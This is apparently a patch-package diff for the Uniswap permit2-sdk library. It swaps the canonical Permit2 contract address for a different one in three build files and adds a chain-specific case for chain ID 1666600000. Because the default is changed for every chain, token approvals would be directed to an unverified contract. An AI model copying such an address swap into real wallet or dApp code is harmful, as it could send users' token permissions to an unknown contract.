@@ -1,0 +1,43 @@
+diff --git a/node_modules/@uniswap/permit2-sdk/dist/constants.d.ts b/node_modules/@uniswap/permit2-sdk/dist/constants.d.ts
+index 5ba3262..241d548 100644
+--- a/node_modules/@uniswap/permit2-sdk/dist/constants.d.ts
++++ b/node_modules/@uniswap/permit2-sdk/dist/constants.d.ts
+@@ -1,5 +1,5 @@
+ import { BigNumber } from '@ethersproject/bignumber';
+-export declare const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
++export declare const PERMIT2_ADDRESS = "0x00000000BD0047637ac6BA3af44b52005ceD9557"
+ export declare function permit2Address(chainId?: number): string;
+ export declare const MaxUint48: BigNumber;
+ export declare const MaxUint160: BigNumber;
+diff --git a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js
+index 3ef42e9..b4c18db 100644
+--- a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js
++++ b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js
+@@ -10,7 +10,7 @@ var bignumber = require('@ethersproject/bignumber');
+ var contracts = require('@ethersproject/contracts');
+ 
+ // @deprecated please use permit2Address(chainId: number)
+-var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
++var PERMIT2_ADDRESS = '0x00000000BD0047637ac6BA3af44b52005ceD9557';
+ function permit2Address(chainId) {
+   switch (chainId) {
+     case 324:
+diff --git a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js
+index de4201a..aeaef71 100644
+--- a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js
++++ b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.esm.js
+@@ -4,11 +4,13 @@ import { BigNumber } from '@ethersproject/bignumber';
+ import { Contract } from '@ethersproject/contracts';
+ 
+ // @deprecated please use permit2Address(chainId: number)
+-var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
++var PERMIT2_ADDRESS = '0x00000000BD0047637ac6BA3af44b52005ceD9557';
+ function permit2Address(chainId) {
+   switch (chainId) {
+     case 324:
+       return '0x0000000000225e31D15943971F47aD3022F714Fa';
++		case 1666600000:
++			return '0x00000000BD0047637ac6BA3af44b52005ceD9557';	
+     default:
+       return PERMIT2_ADDRESS;
+   }
